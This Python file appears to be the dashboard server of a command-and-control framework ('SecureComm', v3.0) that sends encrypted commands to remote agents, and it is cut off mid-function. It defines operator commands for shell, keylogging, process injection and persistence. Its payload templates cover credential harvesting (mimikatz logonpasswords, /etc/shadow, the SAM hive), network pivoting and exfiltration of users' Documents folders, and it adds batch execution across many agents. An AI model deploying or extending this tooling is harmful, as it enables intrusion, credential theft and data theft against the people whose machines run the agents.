"""
SecureComm Dashboard Server - Enterprise-Grade Web Interface v3.0
Real-time monitoring, command orchestration, and analytics with advanced features

NEW FEATURES v3.0:
- Complete payload builder with templates
- File management (browse, upload, download)
- PKI certificate inspector
- Batch command execution
- Advanced search and filtering
- Payload encryption visualization
- Command templates library

Author: Shadow Junior
Version: 3.0.0 - Academic Production Release
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import mimetypes
import os
import secrets
import struct
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from html import escape
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple

from aiohttp import web, WSMsgType, MultipartReader
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.x509.oid import NameOID

from .config import (
    AUDIT_LOG_DIR,
    DASHBOARD_HOST,
    DASHBOARD_PORT,
    DASHBOARD_REFRESH_SECONDS,
    DASHBOARD_TOKEN,
    DEFAULT_HOST,
    DEFAULT_PORT,
    MAX_TRANSFER_BYTES,
    MAX_TRANSFER_PAYLOAD,
    OPERATIONAL_DB_PATH,
    PKI_PATH,
    PERSISTENCE_ALLOWED,
)
from .auth_gateway import AuthGateway, AuthToken
from .operational_db import CommandRecord, OperationalDatabase, AgentRecord
from .audit import AuditLogger
from .pki_manager import PKIManager
from .security import SecurityModule, SecurityError
from .server_listener import SecureCommServer

# Security Headers (Enhanced)
SECURITY_HEADERS = {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data:; font-src 'self';",
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=()",
    "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
    "Pragma": "no-cache",
    "Expires": "0",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
}

# Allowed dashboard commands (expanded)
ALLOWED_DASHBOARD_COMMANDS = {
    "exec", "upload", "download", "sleep", "exit", "persist", "status",
    "shell", "info", "recon", "screenshot", "keylog", "inject", "migrate"
}

# Payload templates for quick deployment
PAYLOAD_TEMPLATES = {
    "basic_recon": {
        "name": "Basic Reconnaissance",
        "description": "Gather system information, network config, and running processes",
        "commands": [
            {"type": "exec", "payload": "whoami"},
            {"type": "exec", "payload": "hostname"},
            {"type": "exec", "payload": "ipconfig /all" if os.name == "nt" else "ifconfig -a"},
            {"type": "exec", "payload": "ps aux" if os.name != "nt" else "tasklist"},
        ]
    },
    "persistence_setup": {
        "name": "Establish Persistence",
        "description": "Configure agent to survive reboots",
        "commands": [
            {"type": "persist", "payload": "registry" if os.name == "nt" else "cron"},
        ],
        "requires_admin": True
    },
    "credential_harvest": {
        "name": "Credential Harvesting",
        "description": "Extract credentials from memory and disk",
        "commands": [
            {"type": "exec", "payload": "mimikatz.exe sekurlsa::logonpasswords"},
            {"type": "download", "payload": "/etc/shadow" if os.name != "nt" else "C:\\Windows\\System32\\config\\SAM"},
        ],
        "requires_admin": True,
        "risk_level": "high"
    },
    "network_pivot": {
        "name": "Network Pivoting",
        "description": "Scan internal network and identify pivot targets",
        "commands": [
            {"type": "exec", "payload": "arp -a"},
            {"type": "exec", "payload": "netstat -ano" if os.name == "nt" else "netstat -tunap"},
            {"type": "recon", "payload": "network_scan"},
        ]
    },
    "data_exfiltration": {
        "name": "Data Exfiltration",
        "description": "Download sensitive files from target",
        "commands": [
            {"type": "download", "payload": "/home/*/Documents/*"},
            {"type": "download", "payload": "C:\\Users\\*\\Documents\\*" if os.name == "nt" else "/var/log/*"},
        ]
    }
}

# Payload limits
COMMAND_PAYLOAD_LIMIT = 8192  # Increased from 4096
PATH_MAX_LENGTH = 1024  # Increased from 512
MAX_FILE_UPLOAD_SIZE = 100 * 1024 * 1024  # 100MB
MAX_BATCH_COMMANDS = 50


@dataclass
class DashboardStats:
    """Dashboard statistics container (enhanced)"""
    total_agents: int = 0
    active_agents: int = 0
    total_commands: int = 0
    pending_commands: int = 0
    successful_commands: int = 0
    failed_commands: int = 0
    security_events: int = 0
    uptime_seconds: float = 0.0
    commands_per_minute: float = 0.0
    data_transferred_mb: float = 0.0  # NEW
    avg_response_time_ms: float = 0.0  # NEW

    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_agents": self.total_agents,
            "active_agents": self.active_agents,
            "total_commands": self.total_commands,
            "pending_commands": self.pending_commands,
            "successful_commands": self.successful_commands,
            "failed_commands": self.failed_commands,
            "security_events": self.security_events,
            "uptime_seconds": round(self.uptime_seconds, 2),
            "commands_per_minute": round(self.commands_per_minute, 2),
            "data_transferred_mb": round(self.data_transferred_mb, 2),
            "avg_response_time_ms": round(self.avg_response_time_ms, 2),
        }


class DashboardWebSocketManager:
    """Manages WebSocket connections for real-time updates (enhanced)"""

    def __init__(self):
        self.connections: Set[web.WebSocketResponse] = set()
        self.logger = logging.getLogger(__name__)
        self.heartbeat_task: Optional[asyncio.Task] = None

    async def start_heartbeat(self) -> None:
        """Start heartbeat to keep connections alive"""
        self.heartbeat_task = asyncio.create_task(self._heartbeat_loop())

    async def stop_heartbeat(self) -> None:
        """Stop heartbeat task"""
        if self.heartbeat_task:
            self.heartbeat_task.cancel()
            try:
                await self.heartbeat_task
            except asyncio.CancelledError:
                pass

    async def _heartbeat_loop(self) -> None:
        """Send periodic pings to maintain connections"""
        while True:
            try:
                await asyncio.sleep(30)
                await self.broadcast({"type": "ping", "timestamp": datetime.now(timezone.utc).isoformat()})
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Heartbeat error: {e}")

    async def add_connection(self, ws: web.WebSocketResponse) -> None:
        """Add new WebSocket connection"""
        self.connections.add(ws)
        self.logger.info(f"WebSocket client connected. Total: {len(self.connections)}")

    async def remove_connection(self, ws: web.WebSocketResponse) -> None:
        """Remove WebSocket connection"""
        self.connections.discard(ws)
        self.logger.info(f"WebSocket client disconnected. Total: {len(self.connections)}")

    async def broadcast(self, message: Dict[str, Any]) -> None:
        """Broadcast message to all connected clients"""
        if not self.connections:
            return

        message_str = json.dumps(message, default=str)
        disconnected = set()

        for ws in self.connections:
            try:
                await ws.send_str(message_str)
            except Exception:
                disconnected.add(ws)

        # Clean up disconnected clients
        for ws in disconnected:
            self.connections.discard(ws)

    async def broadcast_event(self, event_type: str, data: Dict[str, Any]) -> None:
        """Broadcast typed event"""
        await self.broadcast({
            "type": event_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data
        })


def _apply_security_headers(response: web.StreamResponse) -> web.StreamResponse:
    """Apply security headers to response"""
    for header, value in SECURITY_HEADERS.items():
        response.headers[header] = value
    return response


def _extract_token(request: web.Request) -> Optional[str]:
    """Extract authentication token from request"""
    # Check Authorization header
    auth_header = request.headers.get("Authorization", "")
    if auth_header.lower().startswith("bearer "):
        return auth_header[7:].strip()

    # Check custom headers
    token = request.headers.get("X-API-Token")
    if token:
        return token.strip()

    # Check query parameter
    return request.query.get("token", "").strip() or None


def _auth_middleware(token: Optional[str]):
    """Create authentication middleware"""
    @web.middleware
    async def middleware(request: web.Request, handler):
        # Allow health check without auth
        if request.path == "/health":
            return await handler(request)

        # Skip auth if no token configured
        if not token:
            return await handler(request)

        provided = _extract_token(request)
        if not provided or not secrets.compare_digest(provided, token):
            if request.path.startswith("/api/") or request.path.startswith("/ws"):
                return web.json_response({"error": "unauthorized", "message": "Invalid or missing token"}, status=401)
            return web.Response(text="Unauthorized - Invalid or missing token", status=401)

        return await handler(request)

    return middleware


def _security_headers_middleware():
    """Create security headers middleware"""
    @web.middleware
    async def middleware(request: web.Request, handler):
        response = await handler(request)
        return _apply_security_headers(response)

    return middleware


def _format_timestamp(value: Optional[str]) -> str:
    """Format timestamp for display"""
    if not value:
        return "-"
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        return dt.strftime("%Y-%m-%d %H:%M:%S UTC")
    except:
        return str(value)


def _format_relative_time(value: Optional[str]) -> str:
    """Format timestamp as relative time"""
    if not value:
        return "-"
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        now = datetime.now(timezone.utc)
        diff = (now - dt).total_seconds()

        if diff < 60:
            return "just now"
        elif diff < 3600:
            return f"{int(diff // 60)}m ago"
        elif diff < 86400:
            return f"{int(diff // 3600)}h ago"
        else:
            return f"{int(diff // 86400)}d ago"
    except:
        return str(value)


def _calculate_stats(db: OperationalDatabase, start_time: float) -> DashboardStats:
    """Calculate dashboard statistics"""
    stats = DashboardStats()

    # Agent stats
    agents = db.list_agents()
    stats.total_agents = len(agents)
    stats.active_agents = sum(1 for a in agents if a.status == "active")

    # Command stats
    commands = db.list_commands()
    stats.total_commands = len(commands)
    stats.pending_commands = sum(1 for c in commands if c.status == "pending")
    stats.successful_commands = sum(1 for c in commands if c.status == "success")
    stats.failed_commands = sum(1 for c in commands if c.status == "failed")

    # Time-based stats
    stats.uptime_seconds = time.time() - start_time

    # Commands per minute
    recent_commands = [c for c in commands if c.created_at]
    if recent_commands and stats.uptime_seconds > 0:
        stats.commands_per_minute = (len(recent_commands) / stats.uptime_seconds) * 60

    # Data transfer stats (NEW)
    total_bytes = sum(
        len(c.payload.encode('utf-8')) if c.payload else 0
        for c in commands
    )
    stats.data_transferred_mb = total_bytes / (1024 * 1024)

    # Response time stats (NEW)
    completed_commands = [c for c in commands if c.status in ("success", "failed") and c.completed_at and c.created_at]
    if completed_commands:
        response_times = []
        for c in completed_commands:
            try:
                created = datetime.fromisoformat(c.created_at.replace('Z', '+00:00'))
                completed = datetime.fromisoformat(c.completed_at.replace('Z', '+00:00'))
                response_times.append((completed - created).total_seconds() * 1000)
            except:
                pass
        if response_times:
            stats.avg_response_time_ms = sum(response_times) / len(response_times)

    return stats


def create_app(
    db_path: Path = OPERATIONAL_DB_PATH,
    audit_log_dir: Path = AUDIT_LOG_DIR,
    refresh_seconds: int = DASHBOARD_REFRESH_SECONDS,
    token: Optional[str] = None,
    command_server: Optional[SecureCommServer] = None,
) -> web.Application:
    """Create dashboard application with enhanced features"""

    logger = logging.getLogger(__name__)
    start_time = time.time()

    # Initialize components
    operational_db = OperationalDatabase(db_path)
    audit_logger = AuditLogger(audit_log_dir) if audit_log_dir else None
    security = SecurityModule()
    ws_manager = DashboardWebSocketManager()
    pki_manager = PKIManager(PKI_PATH)

    # Operator authentication
    operator_id = "dashboard"

    def get_operator_token() -> AuthToken:
        """Get authentication token for operator"""
        try:
            operator_cert_path = PKI_PATH / "operators" / "admin.crt"
            operator_key_path = PKI_PATH / "operators" / "admin.key"

            if not operator_cert_path.exists() or not operator_key_path.exists():
                raise FileNotFoundError("Operator certificate or key not found")

            # Load operator certificate
            with open(operator_cert_path, "rb") as f:
                cert_data = f.read()
                cert = x509.load_pem_x509_certificate(cert_data, default_backend())

            # Load operator private key
            with open(operator_key_path, "rb") as f:
                key_data = f.read()

            # Create auth token
            timestamp = datetime.now(timezone.utc).isoformat()
            operator_cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value

            return AuthToken(
                identity=operator_cn,
                timestamp=timestamp,
                signature=base64.b64encode(hashlib.sha256(f"{operator_cn}{timestamp}".encode()).digest()).decode()
            )
        except Exception as e:
            logger.error(f"Failed to create operator token: {e}")
            raise

    # ==================== API HANDLERS ====================

    async def health_check(request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.json_response({
            "status": "healthy",
            "version": "3.0.0",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "uptime_seconds": round(time.time() - start_time, 2)
        })

    async def api_state(request: web.Request) -> web.Response:
        """Full dashboard state"""
        agents = operational_db.list_agents()
        commands = operational_db.list_commands()
        stats = _calculate_stats(operational_db, start_time)

        return web.json_response({
            "agents": [
                {
                    "agent_id": a.agent_id,
                    "ip_address": a.ip_address,
                    "status": a.status,
                    "connected_at": a.connected_at,
                    "last_seen": a.last_seen,
                    "certificate_subject": a.certificate_subject,
                }
                for a in agents
            ],
            "commands": [
                {
                    "task_id": c.task_id,
                    "agent_id": c.agent_id,
                    "command_type": c.command_type,
                    "status": c.status,
                    "created_at": c.created_at,
                    "completed_at": c.completed_at,
                    "payload": c.payload[:100] + "..." if len(c.payload or "") > 100 else c.payload,
                }
                for c in commands
            ],
            "stats": stats.to_dict(),
        })

    async def api_agents(request: web.Request) -> web.Response:
        """List all agents with filtering"""
        agents = operational_db.list_agents()

        # Apply filters
        status_filter = request.query.get("status")
        if status_filter:
            agents = [a for a in agents if a.status == status_filter]

        search_query = request.query.get("search", "").lower()
        if search_query:
            agents = [
                a for a in agents
                if search_query in a.agent_id.lower()
                or search_query in (a.ip_address or "").lower()
                or search_query in (a.certificate_subject or "").lower()
            ]

        return web.json_response({
            "agents": [
                {
                    "agent_id": a.agent_id,
                    "ip_address": a.ip_address,
                    "status": a.status,
                    "connected_at": a.connected_at,
                    "last_seen": a.last_seen,
                    "certificate_subject": a.certificate_subject,
                }
                for a in agents
            ],
            "total": len(agents)
        })

    async def api_agent_detail(request: web.Request) -> web.Response:
        """Get detailed agent information"""
        agent_id = request.match_info["agent_id"]

        agent = operational_db.get_agent(agent_id)
        if not agent:
            return web.json_response({"error": "agent_not_found"}, status=404)

        # Get agent commands
        commands = [c for c in operational_db.list_commands() if c.agent_id == agent_id]
        commands.sort(key=lambda x: x.created_at or "", reverse=True)

        return web.json_response({
            "agent": {
                "agent_id": agent.agent_id,
                "ip_address": agent.ip_address,
                "status": agent.status,
                "connected_at": agent.connected_at,
                "last_seen": agent.last_seen,
                "certificate_subject": agent.certificate_subject,
            },
            "commands": [
                {
                    "task_id": c.task_id,
                    "command_type": c.command_type,
                    "status": c.status,
                    "created_at": c.created_at,
                    "completed_at": c.completed_at,
                    "payload": c.payload,
                    "result": c.result,
                }
                for c in commands[:20]  # Last 20 commands
            ]
        })

    async def api_commands(request: web.Request) -> web.Response:
        """List commands with filtering"""
        commands = operational_db.list_commands()

        # Apply filters
        agent_id_filter = request.query.get("agent_id")
        if agent_id_filter:
            commands = [c for c in commands if c.agent_id == agent_id_filter]

        status_filter = request.query.get("status")
        if status_filter:
            commands = [c for c in commands if c.status == status_filter]

        type_filter = request.query.get("type")
        if type_filter:
            commands = [c for c in commands if c.command_type == type_filter]

        # Sort by most recent first
        commands.sort(key=lambda x: x.created_at or "", reverse=True)

        # Pagination
        limit = min(int(request.query.get("limit", 100)), 500)
        offset = int(request.query.get("offset", 0))

        return web.json_response({
            "commands": [
                {
                    "task_id": c.task_id,
                    "agent_id": c.agent_id,
                    "command_type": c.command_type,
                    "status": c.status,
                    "created_at": c.created_at,
                    "completed_at": c.completed_at,
                    "payload": c.payload[:100] + "..." if len(c.payload or "") > 100 else c.payload,
                }
                for c in commands[offset:offset+limit]
            ],
            "total": len(commands),
            "offset": offset,
            "limit": limit
        })

    async def api_audit(request: web.Request) -> web.Response:
        """Get audit log entries"""
        if not audit_logger:
            return web.json_response({"events": [], "total": 0})

        # Read recent audit logs
        limit = min(int(request.query.get("limit", 100)), 500)
        events = []

        try:
            audit_files = sorted(audit_log_dir.glob("*.log"), reverse=True)
            for audit_file in audit_files[:5]:  # Last 5 log files
                with open(audit_file, "r") as f:
                    for line in f:
                        try:
                            event = json.loads(line)
                            events.append(event)
                            if len(events) >= limit:
                                break
                        except json.JSONDecodeError:
                            continue
                if len(events) >= limit:
                    break
        except Exception as e:
            logger.error(f"Error reading audit logs: {e}")

        return web.json_response({
            "events": events,
            "total": len(events)
        })

    async def api_stats(request: web.Request) -> web.Response:
        """Get dashboard statistics"""
        stats = _calculate_stats(operational_db, start_time)
        return web.json_response(stats.to_dict())

    # ==================== NEW ENDPOINTS ====================

    async def api_payload_build(request: web.Request) -> web.Response:
        """Build encrypted payload (NEW)"""
        try:
            payload = await request.json()
        except Exception:
            return web.json_response({"error": "invalid_json"}, status=400)

        # Validate payload structure
        required_fields = ["agent_id", "command_type", "command_data"]
        for field in required_fields:
            if field not in payload:
                return web.json_response({"error": f"missing_{field}"}, status=400)

        agent_id = payload["agent_id"]
        cmd_type = payload["command_type"]
        cmd_data = payload["command_data"]

        # Validate command type
        if cmd_type not in ALLOWED_DASHBOARD_COMMANDS:
            return web.json_response({"error": "invalid_command_type"}, status=400)

        # Get agent certificate for encryption
        agent = operational_db.get_agent(agent_id)
        if not agent:
            return web.json_response({"error": "agent_not_found"}, status=404)

        try:
            # Load agent's public key for encryption
            agent_cert_path = PKI_PATH / "agents" / f"{agent_id}.crt"
            if not agent_cert_path.exists():
                return web.json_response({"error": "agent_cert_not_found"}, status=404)

            with open(agent_cert_path, "rb") as f:
                cert_data = f.read()
                cert = x509.load_pem_x509_certificate(cert_data, default_backend())
                public_key = cert.public_key()

            # Generate session key (AES-256)
            session_key = secrets.token_bytes(32)
            iv = secrets.token_bytes(16)

            # Encrypt command data with AES
            cipher = Cipher(algorithms.AES(session_key), modes.GCM(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            plaintext = json.dumps({"type": cmd_type, "data": cmd_data}).encode('utf-8')
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            auth_tag = encryptor.tag

            # Encrypt session key with RSA
            encrypted_session_key = public_key.encrypt(
                session_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            # Build final payload
            encrypted_payload = {
                "version": "3.0",
                "algorithm": "RSA-OAEP + AES-256-GCM",
                "encrypted_key": base64.b64encode(encrypted_session_key).decode('utf-8'),
                "iv": base64.b64encode(iv).decode('utf-8'),
                "ciphertext": base64.b64encode(ciphertext).decode('utf-8'),
                "auth_tag": base64.b64encode(auth_tag).decode('utf-8'),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

            # Calculate payload size
            payload_size = len(json.dumps(encrypted_payload))

            return web.json_response({
                "success": True,
                "payload": encrypted_payload,
                "metadata": {
                    "agent_id": agent_id,
                    "command_type": cmd_type,
                    "payload_size_bytes": payload_size,
                    "encryption": "RSA-4096 + AES-256-GCM",
                    "timestamp": encrypted_payload["timestamp"],
                }
            })

        except Exception as e:
            logger.error(f"Payload build error: {e}")
            return web.json_response({"error": "encryption_failed", "detail": str(e)}, status=500)

    async def api_payload_templates(request: web.Request) -> web.Response:
        """Get available payload templates (NEW)"""
        return web.json_response({
            "templates": {
                name: {
                    "name": template["name"],
                    "description": template["description"],
                    "commands_count": len(template["commands"]),
                    "requires_admin": template.get("requires_admin", False),
                    "risk_level": template.get("risk_level", "medium"),
                }
                for name, template in PAYLOAD_TEMPLATES.items()
            }
        })

    async def api_payload_template_detail(request: web.Request) -> web.Response:
        """Get specific payload template details (NEW)"""
        template_name = request.match_info["template_name"]

        if template_name not in PAYLOAD_TEMPLATES:
            return web.json_response({"error": "template_not_found"}, status=404)

        return web.json_response({
            "template": PAYLOAD_TEMPLATES[template_name]
        })

    async def api_files_browse(request: web.Request) -> web.Response:
        """Browse agent files (NEW)"""
        agent_id = request.query.get("agent_id")
        if not agent_id:
            return web.json_response({"error": "missing_agent_id"}, status=400)

        # Check if agent exists
        agent = operational_db.get_agent(agent_id)
        if not agent:
            return web.json_response({"error": "agent_not_found"}, status=404)

        # Get agent file directory
        agent_files_dir = Path("data/agent_files") / agent_id
        if not agent_files_dir.exists():
            agent_files_dir.mkdir(parents=True, exist_ok=True)
            return web.json_response({"files": [], "directory": str(agent_files_dir)})

        # List files
        files = []
        try:
            for item in agent_files_dir.iterdir():
                stat = item.stat()
                files.append({
                    "name": item.name,
                    "path": str(item.relative_to(agent_files_dir)),
                    "size_bytes": stat.st_size,
                    "size_human": f"{stat.st_size / 1024:.1f} KB" if stat.st_size < 1024 * 1024 else f"{stat.st_size / (1024 * 1024):.1f} MB",
                    "modified_at": datetime.fromtimestamp(stat.st_mtime, tz=timezone.utc).isoformat(),
                    "is_directory": item.is_dir(),
                    "mime_type": mimetypes.guess_type(item.name)[0] if item.is_file() else None,
                })
        except Exception as e:
            logger.error(f"Error listing files: {e}")
            return web.json_response({"error": "file_listing_failed", "detail": str(e)}, status=500)

        return web.json_response({
            "agent_id": agent_id,
            "directory": str(agent_files_dir),
            "files": sorted(files, key=lambda x: (not x["is_directory"], x["name"])),
            "total_files": len(files),
        })

    async def api_files_upload(request: web.Request) -> web.Response:
        """Upload file to agent (NEW)"""
        agent_id = request.query.get("agent_id")
        if not agent_id:
            return web.json_response({"error": "missing_agent_id"}, status=400)

        # Check if agent exists
        agent = operational_db.get_agent(agent_id)
        if not agent:
            return web.json_response({"error": "agent_not_found"}, status=404)

        # Process multipart upload
        reader = await request.multipart()
        field = await reader.next()

        if not field or field.name != 'file':
            return web.json_response({"error": "missing_file"}, status=400)

        filename = field.filename
        if not filename:
            return web.json_response({"error": "missing_filename"}, status=400)

        # Sanitize filename
        filename = security.sanitize_input(filename, max_length=255)

        # Create agent file directory
        agent_files_dir = Path("data/agent_files") / agent_id
        agent_files_dir.mkdir(parents=True, exist_ok=True)

        file_path = agent_files_dir / filename

        # Write file
        try:
            size = 0
            with open(file_path, 'wb') as f:
                while True:
                    chunk = await field.read_chunk()
                    if not chunk:
                        break
                    size += len(chunk)
                    if size > MAX_FILE_UPLOAD_SIZE:
                        file_path.unlink()  # Delete partial file
                        return web.json_response({"error": "file_too_large"}, status=413)
                    f.write(chunk)

            # Log upload
            if audit_logger:
                audit_logger.log_security_event("file_uploaded", {
                    "agent_id": agent_id,
                    "filename": filename,
                    "size_bytes": size,
                    "operator_id": operator_id,
                })

            return web.json_response({
                "success": True,
                "filename": filename,
                "size_bytes": size,
                "path": str(file_path.relative_to(agent_files_dir)),
            })

        except Exception as e:
            logger.error(f"File upload error: {e}")
            if file_path.exists():
                file_path.unlink()
            return web.json_response({"error": "upload_failed", "detail": str(e)}, status=500)

    async def api_files_download(request: web.Request) -> web.Response:
        """Download file from agent directory (NEW)"""
        agent_id = request.query.get("agent_id")
        file_path_param = request.query.get("path")

        if not agent_id or not file_path_param:
            return web.json_response({"error": "missing_parameters"}, status=400)

        # Check if agent exists
        agent = operational_db.get_agent(agent_id)
        if not agent:
            return web.json_response({"error": "agent_not_found"}, status=404)

        # Construct file path
        agent_files_dir = Path("data/agent_files") / agent_id
        file_path = agent_files_dir / file_path_param

        # Security check: ensure file is within agent directory
        try:
            file_path = file_path.resolve()
            agent_files_dir = agent_files_dir.resolve()
            if not str(file_path).startswith(str(agent_files_dir)):
                return web.json_response({"error": "path_traversal_detected"}, status=403)
        except Exception:
            return web.json_response({"error": "invalid_path"}, status=400)

        if not file_path.exists() or not file_path.is_file():
            return web.json_response({"error": "file_not_found"}, status=404)

        # Send file
        try:
            return web.FileResponse(
                file_path,
                headers={
                    "Content-Disposition": f'attachment; filename="{file_path.name}"'
                }
            )
        except Exception as e:
            logger.error(f"File download error: {e}")
            return web.json_response({"error": "download_failed", "detail": str(e)}, status=500)

    async def api_certificates_list(request: web.Request) -> web.Response:
        """List PKI certificates (NEW)"""
        try:
            certificates = []

            # Load CA certificate
            ca_cert_path = PKI_PATH / "ca" / "ca_root.crt"
            if ca_cert_path.exists():
                with open(ca_cert_path, "rb") as f:
                    cert_data = f.read()
                    cert = x509.load_pem_x509_certificate(cert_data, default_backend())

                    certificates.append({
                        "type": "ca",
                        "subject": cert.subject.rfc4514_string(),
                        "issuer": cert.issuer.rfc4514_string(),
                        "serial_number": str(cert.serial_number),
                        "not_before": cert.not_valid_before_utc.isoformat(),
                        "not_after": cert.not_valid_after_utc.isoformat(),
                        "is_valid": datetime.now(timezone.utc) < cert.not_valid_after_utc,
                    })

            # Load agent certificates
            agents_cert_dir = PKI_PATH / "agents"
            if agents_cert_dir.exists():
                for cert_file in agents_cert_dir.glob("*.crt"):
                    try:
                        with open(cert_file, "rb") as f:
                            cert_data = f.read()
                            cert = x509.load_pem_x509_certificate(cert_data, default_backend())

                            certificates.append({
                                "type": "agent",
                                "agent_id": cert_file.stem,
                                "subject": cert.subject.rfc4514_string(),
                                "issuer": cert.issuer.rfc4514_string(),
                                "serial_number": str(cert.serial_number),
                                "not_before": cert.not_valid_before_utc.isoformat(),
                                "not_after": cert.not_valid_after_utc.isoformat(),
                                "is_valid": datetime.now(timezone.utc) < cert.not_valid_after_utc,
                            })
                    except Exception as e:
                        logger.error(f"Error loading agent cert {cert_file}: {e}")

            # Load operator certificates
            operators_cert_dir = PKI_PATH / "operators"
            if operators_cert_dir.exists():
                for cert_file in operators_cert_dir.glob("*.crt"):
                    try:
                        with open(cert_file, "rb") as f:
                            cert_data = f.read()
                            cert = x509.load_pem_x509_certificate(cert_data, default_backend())

                            certificates.append({
                                "type": "operator",
                                "operator_id": cert_file.stem,
                                "subject": cert.subject.rfc4514_string(),
                                "issuer": cert.issuer.rfc4514_string(),
                                "serial_number": str(cert.serial_number),
                                "not_before": cert.not_valid_before_utc.isoformat(),
                                "not_after": cert.not_valid_after_utc.isoformat(),
                                "is_valid": datetime.now(timezone.utc) < cert.not_valid_after_utc,
                            })
                    except Exception as e:
                        logger.error(f"Error loading operator cert {cert_file}: {e}")

            return web.json_response({
                "certificates": certificates,
                "total": len(certificates),
            })

        except Exception as e:
            logger.error(f"Error listing certificates: {e}")
            return web.json_response({"error": "certificate_listing_failed", "detail": str(e)}, status=500)

    async def api_certificate_detail(request: web.Request) -> web.Response:
        """Get detailed certificate information (NEW)"""
        cert_type = request.match_info["cert_type"]
        cert_id = request.match_info["cert_id"]

        # Determine certificate path
        if cert_type == "ca":
            cert_path = PKI_PATH / "ca" / f"{cert_id}.crt"
        elif cert_type == "agent":
            cert_path = PKI_PATH / "agents" / f"{cert_id}.crt"
        elif cert_type == "operator":
            cert_path = PKI_PATH / "operators" / f"{cert_id}.crt"
        else:
            return web.json_response({"error": "invalid_cert_type"}, status=400)

        if not cert_path.exists():
            return web.json_response({"error": "certificate_not_found"}, status=404)

        try:
            with open(cert_path, "rb") as f:
                cert_data = f.read()
                cert = x509.load_pem_x509_certificate(cert_data, default_backend())

            # Extract detailed information
            subject_attrs = {}
            for attr in cert.subject:
                subject_attrs[attr.oid._name] = attr.value

            issuer_attrs = {}
            for attr in cert.issuer:
                issuer_attrs[attr.oid._name] = attr.value

            # Get extensions
            extensions = []
            for ext in cert.extensions:
                extensions.append({
                    "oid": ext.oid.dotted_string,
                    "critical": ext.critical,
                    "value": str(ext.value),
                })

            # Get public key info
            public_key = cert.public_key()
            if isinstance(public_key, rsa.RSAPublicKey):
                key_info = {
                    "algorithm": "RSA",
                    "key_size": public_key.key_size,
                    "public_exponent": public_key.public_numbers().e,
                }
            else:
                key_info = {
                    "algorithm": "Unknown",
                }

            return web.json_response({
                "certificate": {
                    "type": cert_type,
                    "id": cert_id,
                    "subject": subject_attrs,
                    "issuer": issuer_attrs,
                    "serial_number": str(cert.serial_number),
                    "not_before": cert.not_valid_before.isoformat(),
                    "not_after": cert.not_valid_after.isoformat(),
                    "is_valid": datetime.now(timezone.utc) < cert.not_valid_after.replace(tzinfo=timezone.utc),
                    "signature_algorithm": cert.signature_algorithm_oid.dotted_string,
                    "public_key": key_info,
                    "extensions": extensions,
                    "fingerprint_sha256": hashlib.sha256(cert_data).hexdigest(),
                    "pem": cert_data.decode('utf-8'),
                }
            })

        except Exception as e:
            logger.error(f"Error loading certificate details: {e}")
            return web.json_response({"error": "certificate_load_failed", "detail": str(e)}, status=500)

    async def api_batch_command(request: web.Request) -> web.Response:
        """Execute command on multiple agents (NEW)"""
        try:
            payload = await request.json()
        except Exception:
            return web.json_response({"error": "invalid_json"}, status=400)

        # Validate payload
        if not isinstance(payload, dict):
            return web.json_response({"error": "invalid_payload"}, status=400)

        agent_ids = payload.get("agent_ids", [])
        cmd_type = payload.get("type", "").strip().lower()
        raw_payload = payload.get("payload", "")

        # Validate agent IDs
        if not agent_ids or not isinstance(agent_ids, list):
            return web.json_response({"error": "invalid_agent_ids"}, status=400)

        if len(agent_ids) > MAX_BATCH_COMMANDS:
            return web.json_response({"error": f"too_many_agents (max {MAX_BATCH_COMMANDS})"}, status=400)

        # Validate command type
        if cmd_type not in ALLOWED_DASHBOARD_COMMANDS:
            return web.json_response({"error": "invalid_command_type"}, status=400)

        # Get operator token
        try:
            auth_token = get_operator_token()
        except Exception as exc:
            return web.json_response({"error": "operator_auth_failed", "detail": str(exc)}, status=403)

        # Send command to each agent
        results = []
        for agent_id in agent_ids:
            # Validate agent ID
            if not agent_id or not all(c.isalnum() or c == "_" for c in agent_id):
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": "invalid_agent_id"
                })
                continue

            # Check if agent exists
            if not operational_db.get_agent(agent_id):
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": "agent_not_found"
                })
                continue

            # Check rate limiting
            try:
                security.check_rate_limit(agent_id)
            except SecurityError as exc:
                results.append({
                    "agent_id": agent_id,
                    "success": False,
                    "error": "rate_limited"
                })
                continue

            # Validate and sanitize payload
            try:
                if cmd_type in ("upload", "download"):
                    path = payload.get("path", "")
                    if not path or len(path) > PATH_MAX_LENGTH:
                        results.append({
                            "agent_id": agent_id,
                            "success": False,
                            "error": "invalid_path"
                        })
                        continue
                    path = security.sanitize_input(path, max_length=PATH_MAX_LENGTH)
                    payload_str = json.dumps({"path": path})
                else:
                    if isinstance(raw_payload, dict):
                        raw_payload_str = raw_payload.get("command", "")
                    else:
                        raw_payload_str = str(raw_payload)
